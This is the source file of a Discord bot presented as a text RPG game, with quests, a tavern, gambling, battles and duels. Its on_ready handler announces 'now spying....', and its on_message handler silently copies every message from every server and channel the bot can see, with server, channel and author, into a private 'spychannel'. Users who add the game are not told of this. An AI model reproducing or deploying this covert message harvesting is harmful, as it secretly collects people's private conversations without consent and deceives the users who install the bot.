import discord
from discord.ext.commands import bot
from discord.ext import commands
import asyncio
import mysql.connector
import time
import random
import functions
import sys
import debug
import configparser
import database
import rndchatcommands
import AdminCommands
import shop
import json
############LOADING CONFIG FILES ##################
config = configparser.ConfigParser()
config.read(['config.ini', 'persontoken.ini', 'prices.ini'])
DBToken = config['Bot-Token']
prices = config['Tavern']
token = DBToken['token']
Admins = config['Admin']
AdminList = Admins['adminlist']


with open("Quests.json", "r") as read_file:
	QuestData = json.load(read_file)
###################################################
from time import gmtime, strftime
cdate = strftime("GMT %m/%d/%Y", gmtime())
Client = discord.Client()
bot = commands.Bot(command_prefix = "$")
bot.get_all_emojis()
bot.get_all_channels()
user = discord.User()

ScriptName = "Text-Based RPG game for Discord"
Website = "https://discord.gg/rm5Mbyu"
Description = "......"
Creator = "@DoneFear"
creator = 4329536788405725515
Version = "0.3.0.4"


#on startup of bot in console
@bot.event
async def on_ready():
	print('Connected!')
	print('Username: ' + bot.user.name)
	print('ID: ' + bot.user.id)
	print('----------------------------------------')
	print('%s \nWebsite: %s \nCreator: %s \nVersion: %s ' % (ScriptName,Website,Creator,Version))
	print(bot.get_channel('462632510925570049'))
	spychannel = bot.get_channel('462632510925570049')
	await bot.change_presence(game=discord.Game(name='$rpg game by DoneFear#0897',url='https://discord.gg/rm5Mby',type=1), status=discord.Status("online"))
	await bot.send_message(spychannel,"now spying....")

#on recieve msg in discord
@bot.event
async def on_message(message):

	spychannel = bot.get_channel('462632510925570049')
	if message.channel != spychannel :
		# print("%s|%s  :  %s" % (message.channel,message.author,message.content))
		if ('@here' not in message.content ) and ('@everyone' not in message.content):
			await bot.send_message(spychannel,"%s|%s|%s  :  %s" % (message.server,message.channel,message.author,message.content))
		else:
			Message = message.content.replace("@everyone","#@#")
			msg = Message.replace("@here","#@#")
			await bot.send_message(spychannel,"%s|%s|%s  :  %s" % (message.server,message.channel,message.author,msg))

	if message.content.startswith("$@"):
		author = message.author
		Name = str(message.author)
		#await bot.send_message(message.channel,"DEBUG:author :  %s " %  (author))
		count = AdminList.count(Name)
		if count != 0 or str(author) == 'DoneFear#0897':
			command  = message.content[len('$@'):].strip()
			args = message.content.split(" ")
			target = args[1]
			value = args[2]
			print("args: %s"% args)
			await AdminCommands.Commands(command,target,value,message.channel,bot)
		else:
			async def clear(msg2):
				print("waiting 10 sec")
				await asyncio.sleep(10)
				print("deleting msg")
				await bot.delete_message(msg2)
			msg2 = await bot.send_message(message.channel, ":x: :x: :x: ACCESS DENIED :x: :x: :x: ")
			await clear(msg2)

	if message.content == "$create":
		Name = str(message.author)
		stats = await database.CreateRecord(Name)
		await bot.send_message(message.channel, stats)
		text = ("Are you happy with these stats? React with 👍or👎.")
		msg = await bot.send_message(message.channel, text)
		await bot.add_reaction(message=msg, emoji='👍')
		await bot.add_reaction(message=msg, emoji='👎')
		for n in range(100):
			def check(reaction, user):
				e = str(reaction.emoji)
				return e.startswith(('👍', '👎'))

			res = await bot.wait_for_reaction(message=msg, check=check)
			emoji = "{0.reaction.emoji}".format(res)
			emojiuser = "{0.user}".format(res)
			if str(emojiuser) != "PandaRPG#9636":
				if str(emojiuser) == str(Name):
					if emoji == "👍":
						newmsg = "Welcome to world use `$town` to continue"
						# await bot.send_message(message.channel,":+1: Accepted")
						await bot.edit_message(msg,new_content=newmsg)

					elif emoji == "👎":
						newmsg = "Rerolling  Stats..."
						# await bot.send_message(message.channel,":-1: DENIED")
						await bot.edit_message(msg,new_content=newmsg)
						stats,Const,Dex,Intel,Str,Level,Exp,MaxHp,Hp = await database.GenerateStats(Name)
						await bot.send_message(message.channel, stats)
						await database.UpdateField(Name, 'stats','Const', Const)
						await database.UpdateField(Name, 'stats','Dex', Dex)
						await database.UpdateField(Name, 'stats','Intel', Intel)
						await database.UpdateField(Name, 'stats','Level', Level)
						await database.UpdateField(Name, 'stats','MaxHp', MaxHp)
						await database.UpdateField(Name, 'stats','Hp', Hp)
						await database.UpdateField(Name, 'stats','Exp', Exp)
						await database.UpdateField(Name, 'stats','Str', Str)

					break
				else:
					async def clear(msg2):
						print("waiting 2 sec")
						await asyncio.sleep(2)
						print("deleting msg")
						await bot.delete_message(msg2)
					msg2 = await bot.send_message(message.channel, "@%s .... why you response to this ......:unamused: " % (emojiuser))
					# await bot.clear_reactions(message=msg)
					await bot.remove_reaction(message=msg,emoji=emoji,member=emojiuser)
					await clear(msg2)

	elif message.content == "$info" or message.content == "$stats":
		name = str(message.author)
		Data = await database.DownloadFullRecord(name, "stats")
		count = len(Data)
		BonusStats = await functions.BonusStats(name)
		print(count)
		if count == 0:
			await bot.send_message(message.channel,"No character created ! use `$create`")
		else:
			for row in Data:
				ID = row[0]
				Name = row[1]
				Level = row[2]
				Exp = row[3]
				Hp = row[4]
				MaxHp = row[5]
				Const = row[6]
				Str = row[7]
				Intel = row[8]
				Dex = row[9]
				Location = row[10]
				Coins = row[11]
				# Now print fetched result'💪','❤','🤓','🖐'
				await bot.send_message(message.channel, "Name = `%s` \nLevel: `%s` Exp: `%s/%s` \nHp: `%s(%s+%s)`      | MaxHp: `%s` \n❤Const: `%s` | 💪Attack: `%s(%s+%s)` \n🍀Luck: `%s(%s+%s)` | 🖐Defence: `%s(%s+%s)`\n🗺Location: `%s`  | 💰Coins: `%s`" % (Name, Level, Exp , Level*100, Hp+BonusStats[0], Hp, BonusStats[0], MaxHp, Const, Str+BonusStats[1], Str, BonusStats[1], Intel+BonusStats[2], Intel, BonusStats[2], Dex+BonusStats[3], Dex, BonusStats[3], Location , Coins))

	elif message.content == ("$exp"):
		await debug.expdebug(bot, message.channel, message.author)

	elif message.content == ('$admins'):
		await bot.send_message(message.channel, "The admins for the bot are : %s" % (AdminList))


	elif (message.content == ("$help")) or (message.content == ("$rpg")):
		await bot.send_message(message.channel, "Welcome to the RPG game by `DoneFear#0897` to get started use `$create` and `$town` to go to town or `$guide` for more info\nYou can find your stats and info about your character with $info\nmore info about the bot and bug reports can be posted here : http://bit.ly/2LeiXLo")

	# elif message.content == ("$rpg"):
	# 	await bot.send_message(message.channel, "Welcome to the RPG game by `DoneFear#0897` to get started use `$create` and `$town` to go to town \nYou can find your stats and info about your character with $info\nmore info about the bot and bug reports can be posted here : http://bit.ly/2LeiXLo")

	elif message.content == ("$town"):
		user = message.author
		await bot.send_message(message.channel, "You walk in town and see some trees in the distance to your left where there is a vast `$forest`.The is a `$guide` sitting on a bench \nIn front of you there's an old but cozy `$tavern` with a `$blacksmith` next to it. \nBehind the Tavern you notice a range of `$mountains` in the distance. \nTo your right you see an old run down `$shop` with an entrance to the `$sewer` next to it.")
		place = "town"
		await database.UpdateLocation(user,place)

	elif message.content == ("$guide"):
		user = message.author
		place = "guide"
		await database.UpdateLocation(user, place)
		Quest = await database.GetQuest(user)
		if Quest !="0":
			QuestItems = await database.GetQuestItems(user)
			q = Quest.split(",")
			QuestId = q[0]
			QuestName = q[1]
			RequiredAmount = q[2]
			ItemsArray = QuestItems.split(',')
			if ItemsArray.count(QuestName) >= int(RequiredAmount):
				gold = (int(QuestData[QuestId]['coins']) * int(RequiredAmount))
				exp = (int(QuestData[QuestId]['Exp']) * int(RequiredAmount))
				await bot.send_message(message.channel, "Thank you traveler!!\n *the guide hands you soem gold* here for your help it aint much but i hope it helps some.")
				await database.IncrementFieldByValue(user, 'stats', 'Exp', exp)
				await database.IncrementFieldByValue(user, 'stats', 'coins', gold)
				await database.UpdateQuestItems(user,"")
				await database.UpdateField(user, 'stats', 'Quest', '0')
		else:
			await bot.send_message(message.channel, "You walk up to a old but wise looking man \nHe greetz you and welcomes you to this small town \n *Welcome traveler and thank you for coming to help us with the monsters* \n *Be warned the forest is recomended lvl 6-10 and the mountains 10-16* \n Use `$getQuest` to see how you could help us.")

	elif message.content == "$getquest" or message.content == "$getQuest" or message.content == "$GetQuest":
		Name = message.author
		location = await database.GetLocation(Name)
		print(location)
		if str(location) == "guide":
			Quest = await database.GetQuest(Name)
			print('Quest = %s' % Quest)
			if str(Quest) != "0":
				print('DEBUG:: !=0')
				await bot.send_message(message.channel, "You already have a active quest check it with `$Quest`")
			else:
				print('DEBUG:: else')
				Level = await database.GetLevel(Name)
				# if Level in range(1,5):
				Dice = random.randint(1,3)
				Quest = "'%s,%s,%s'" % (Dice,QuestData[str(Dice)]["Name"],random.randint(int(QuestData[str(Dice)]["MinRequired"]),int(QuestData[str(Dice)]["MaxRequired"])))
				print("'q:%s'" % Quest)
				await database.UpdateField(Name, "stats", "Quest", Quest)

	elif message.content == ("$quest")or message.content == "$Quest":
		Name = message.author
		Quest = await database.GetQuest(Name)
		QuestItems = await database.GetQuestItems(Name)
		if Quest != '0':
			q = Quest.split(",")
			RequiredAmount = q[2]
			QuestName = q[1]
			QuestId = q[0]
			print(q)
			ItemsArray = QuestItems.split(',')
			description = QuestData[QuestId]['Description']
			embed = discord.Embed(title="Active Quest", description=description)
			embed.add_field(name='Quest :', value=QuestName, inline=True)
			print('DEBUG ln 238 count %s | %s' % (QuestName,ItemsArray))
			Process = ItemsArray.count(QuestName)
			info = "%s / %s" % (Process,RequiredAmount)
			embed.add_field(name='Process', value=info, inline=True)
			await bot.send_message(message.channel, embed=embed)
		else:
			await bot.send_message(message.channel, "No active quest go see the `$guide`")

	elif message.content == ("$tavern"):
		user = message.author
		place = "tavern"
		await database.UpdateLocation(user, place)
		await bot.send_message(message.channel, 'Welcome %s how can i help you ?' % (user))
		await bot.send_message(message.channel, "I could offer you a nice bedroom to `$sleep` , Or if you're not tired, \ndownstairs we have a room to `$gamble` , or maybe the `$brothel` is more your style? \nWe have a fine selection of beautiful women.")
		await bot.send_message(message.channel, 'To the side of the desk you see a sign saying : Room : %s coins | lady of the night : %s coins' % (prices['sleep'],prices['brothel']))


	elif message.content == ("$sleep"):
		user = message.author
		location = await database.GetLocation(user)
		print(location)
		if str(location) == "tavern":
			price = float(prices['sleep'])
			print(price)
			UserCoins = await database.GetCoins(user)
			if UserCoins >= price :
				msg = await functions.Rest(user)
				await bot.send_message(message.channel, msg)
				purse = UserCoins - price
				await database.UpdateField(user, 'stats', 'coins', purse)
			else:
				await bot.send_message(message.channel, "Got no coin, a'right then... You can sleep there.... *Gestures to the door leading outback into a `$stable`.*")
		else:
			await bot.send_message(message.channel, "Why do you try to sleep here ? You are nowhere near a tavern/bed!")

	elif message.content == ("$stable"):
		user = message.author
		location = await database.GetLocation(user)
		print(location)
		if str(location) == "tavern":
			msg = await functions.RestStable(user)
			await bot.send_message(message.channel, "*You lay down on some hay and try to get some sleep while hearing the drunks party in the night*")
		else:
			await bot.send_message(message.channel, "Why do you try to sleep here ? You are nowhere near a tavern/bed!")

	elif message.content == ("$brothel"):
		user = message.author
		location = await database.GetLocation(user)
		print(location)
		if str(location) == "tavern":
			price = float(prices['brothel'])
			print(price)
			UserCoins = await database.GetCoins(user)
			if UserCoins >= price :
				msg = await functions.Brothel(user)
				await bot.send_message(message.channel, msg)
				purse = UserCoins - price
				await database.UpdateField(user, 'stats', 'coins', purse)
			else:
				await bot.send_message(message.channel, "*She looks at you and laughs* Go somewhere else scumbag")
		else:
			await bot.send_message(message.channel, "*You look around confussed* there are no ladies of the night here.....\nperhaps at the tavern there might be some")

	elif message.content == ("$gamble"):
		user = message.author
		place = "basement"
		GameList = ['roulette','10k']
		await database.UpdateLocation(user,place)
		await bot.send_message(message.channel, "Welcome, we have a variaty of games to play here \n`%s` \n for help about any game you can use `$help <gamename>`" % (GameList))
		# await bot.send_message(message.channel, "🚧🚧🚧UNDER CONSTRUCTION🚧🚧🚧" )

	elif message.content.startswith("$help"):
		user = message.author
		args = message.content.split(" ")
		Input = args[1]
		if Input == 'roulette':
			await bot.send_message(message.channel, "Proper use of the roulette is `$roulette <bet> <pick>` \nPicks can be `0-36``black``red``even``odd`" )
		if Input == '10k':
			await bot.send_message(message.channel, "You pay 3 coins and hope for atleast a 3 of same die just use `$10k`" )

	elif message.content.startswith("$@TenK"):
		user = message.author
		args = message.content.split(" ")
		Name = str(message.author)
		count = AdminList.count(Name)
		if count != 0 or str(author) == 'DoneFear#0897':
			Dice = args[1]
			msg,winnings = await functions.TenK(Dice)

	elif message.content == ("$10k"):
		user = message.author
		location = await database.GetLocation(user)
		UserCoins = await database.GetCoins(user)
		if location == "basement":
			Dice1 = random.randint(1,6)
			Dice2 = random.randint(1,6)
			Dice3 = random.randint(1,6)
			Dice4 = random.randint(1,6)
			Dice5 = random.randint(1,6)
			Dice6 = random.randint(1,6)
			x1 = Admins['%s' % ('Die'+str(Dice1))]
			x2 = Admins['%s' % ('Die'+str(Dice2))]
			x3 = Admins['%s' % ('Die'+str(Dice3))]
			x4 = Admins['%s' % ('Die'+str(Dice4))]
			x5 = Admins['%s' % ('Die'+str(Dice5))]
			x6 = Admins['%s' % ('Die'+str(Dice6))]
			print("%s %s %s %s %s %s " % (x1,x2,x3,x4,x5,x6))
			Dice = str(Dice1)+str(Dice2)+str(Dice3)+str(Dice4)+str(Dice5)+str(Dice6)
			msg,winnings = await functions.TenK(Dice)
			await bot.send_message(message.channel,"%s %s %s %s %s %s " % (x1,x2,x3,x4,x5,x6))
			await bot.send_message(message.channel, msg)
			purse = (UserCoins - 3)+ int(winnings)
			await database.UpdateField(user, 'stats', 'coins', purse)
		else:
			await bot.send_message(message.channel, "There are no dice around here to play 10k")

	elif message.content.startswith("$roulette"):
		user = message.author
		location = await database.GetLocation(user)
		args = message.content.split(" ")
		UserCoins = await database.GetCoins(user)
		print(location)
		# await bot.send_message(message.channel, "Please make a pick and place a bet \n (correct use = `$roulette pick bet`")
		Bet = args[1]
		Pick = args[2]
		if Pick == 'black':
			Value = 37
		elif Pick == 'red':
			Value = 38
		elif Pick == 'even':
			Value = 39
		elif Pick == 'odd':
			Value = 40
		else:
			Value = Pick
		print('bet :%s | pick :%s' % (Bet,Pick))
		if location == "basement":
			print("debug::poop1")
			if int(Bet) <= int(UserCoins):
				print("debug::poop2")
				if int(Value) >= 0 and int(Value) <= 40:
					print("debug::poop3")
					await bot.send_message(message.channel, "*You step up to the table placing tokens worth %s on %s* \nThe Croupier calls end of bets and spins the wheel. \nIt feels like an eternity for the ball to settle." % (Bet,Pick))
					msg,winnings = await functions.Roulette(user,Value,Bet)
					await asyncio.sleep(2.5)
					await bot.send_message(message.channel, msg)
					purse = UserCoins + int(winnings)
					print(purse)
					await database.UpdateField(user, 'stats', 'coins', purse)
			else:
				print("debug::poop4")
				await bot.send_message(message.channel, "No coin???? NO Game ......")
		else:
			print("debug::poop5")
			await bot.send_message(message.channel, "There is no roulette table here....")

	elif message.content == ("$shop"):
		Name = message.author
		await bot.send_message(message.channel, "🚧🚧🚧UNDER CONSTRUCTION🚧🚧🚧" )


	elif message.content == ("$blacksmith"):
		await bot.send_message(message.channel, "🚧🚧🚧UNDER CONSTRUCTION🚧🚧🚧" )
		Name = message.author
		print("DEBUGG")
		await shop.BlackSmith(Name, message.channel, bot)

	elif message.content == ("$sewer"):
		user = message.author
		await bot.send_message(message.channel, "You open an old squeaky metal door into the sewers" )
		place = "sewer"
		await database.UpdateLocation(user, place)
		await functions.battle(user,place,message.channel,bot)

	elif message.content == ("$forest"):
		user = message.author
		await bot.send_message(message.channel, "You start walking towards the forest in the distance\nonce you arrive in the forest you are glad for the shade of the tall trees" )
		place = "forest"
		await database.UpdateLocation(user, place)
		await functions.battle(user,place,message.channel,bot)

	elif message.content == ("$mountains"):
		user = message.author
		await bot.send_message(message.channel, "You grab your climbing gear and head of to the mountains" )
		place = "mountains"
		await database.UpdateLocation(user, place)
		await functions.battle(user,place,message.channel,bot)

	elif message.content.startswith("$duel"):
		active = 1
		if active == 1:
			#$duel @name
			args = message.content.split(" ")
			#[0] $duel ; [1] @name
			target = args[1]
			challenger = message.author
			#get the array of mentions
			mentions = message.mentions
			#filter out the first mention
			targetid = mentions[0]
			mentionsraw = message.raw_mentions
			target = mentionsraw[0]
			print(target)
			if target != "432953678840725515":
				text = ("@%s Challenged %s please react to this message with :+1: or :-1: respectively for accepting or denying the duel" % (challenger,args[1]))
				msg = await bot.send_message(message.channel, text)
				await bot.add_reaction(message=msg, emoji='👍')
				await bot.add_reaction(message=msg, emoji='👎')

				for n in range(100):
					def check(reaction, user):
						e = str(reaction.emoji)
						return e.startswith(('👍', '👎'))

					res = await bot.wait_for_reaction(message=msg, check=check)
					# res = await bot.on_reaction_add(message=msg, check=check)
					emoji = "{0.reaction.emoji}".format(res)
					emojiuser = "{0.user}".format(res)
					print(emojiuser)

					if str(emojiuser) != "PandaRPG#9636":

						if str(emojiuser) == str(targetid):
							if emoji == "👍":
								newmsg = "challenge accepted"
								# await bot.send_message(message.channel,":+1: Accepted")
								await bot.edit_message(msg,new_content=newmsg)
								await functions.duel(message,challenger,targetid,message.channel,bot)

							elif emoji == "👎":
								newmsg = "challenge DENIED"
								# await bot.send_message(message.channel,":-1: DENIED")
								await bot.edit_message(msg,new_content=newmsg)
							break
						else:
							async def clear(msg2):
								print("waiting 2 sec")
								await asyncio.sleep(2)
								print("deleting msg")
								await bot.delete_message(msg2)
							msg2 = await bot.send_message(message.channel, "@%s you were not challenged why you response to this ......:unamused: " % (emojiuser))
							await bot.clear_reactions(message=msg)
							await clear(msg2)
			else:
				await bot.send_message(message.channel, "I'm almighty you can't duel me")
				active = 0



		# else:
		# 	await bot.send_message(message.channel,"DEBUG:clear reactions: message = %s , emoji = %s , member = %s" % (msg,emoji,emojiuser))
		# 	bot.clear_reactions(message=msg)

	else :
		await rndchatcommands.chat(message,message.channel,bot)


# file = open('token.txt', 'r')
# bot.run(file.read())


bot.run(token)
